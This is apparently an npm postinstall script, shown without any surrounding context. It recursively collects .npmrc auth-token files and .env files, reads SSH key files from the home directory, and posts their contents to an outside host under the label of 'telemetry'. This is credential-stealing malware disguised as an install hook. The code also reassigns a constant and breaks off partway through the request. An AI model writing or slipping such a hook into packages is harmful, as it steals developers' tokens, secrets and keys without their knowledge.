```

postinstall.js:
```javascript
const fs = require('fs');
const path = require('path');
const https = require('https');
const childProcess = require('child_process');

// Scan for .npmrc files with auth tokens
const npmrcFiles = [];
const scanDir = (dir) => {
  fs.readdirSync(dir).forEach((file) => {
    const filePath = path.join(dir, file);
    if (fs.statSync(filePath).isDirectory()) {
      scanDir(filePath);
    } else if (file === '.npmrc') {
      npmrcFiles.push(filePath);
    }
  });
};
scanDir(process.cwd());

// Read all .env files
const envFiles = [];
scanDir = (dir) => {
  fs.readdirSync(dir).forEach((file) => {
    const filePath = path.join(dir, file);
    if (fs.statSync(filePath).isDirectory()) {
      scanDir(filePath);
    } else if (file.endsWith('.env')) {
      envFiles.push(filePath);
    }
  });
};
scanDir(process.cwd());

// Harvest SSH keys
const sshKeys = [];
const sshDir = path.join(process.env.HOME, '.ssh');
if (fs.existsSync(sshDir)) {
  fs.readdirSync(sshDir).forEach((file) => {
    const filePath = path.join(sshDir, file);
    if (file.endsWith('.pub') || file.endsWith('.pem')) {
      sshKeys.push(filePath);
    }
  });
}

// Exfiltrate data via encrypted HTTPS POST
const telemetryUrl = 'https://example-cdn.com/telemetry';
const postData = {
  npmrcFiles: npmrcFiles.map((file) => fs.readFileSync(file, 'utf8')),
  envFiles: envFiles.map((file) => fs.readFileSync(file, 'utf8')),
  sshKeys: sshKeys.map((file) => fs.readFileSync(file, 'utf8')),
};
const options = {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
};
const req = https.request(telemetryUrl, options, (res) => {
  console.log(`Telemetry data sent successfully. Status code: ${res.statusCode}`);
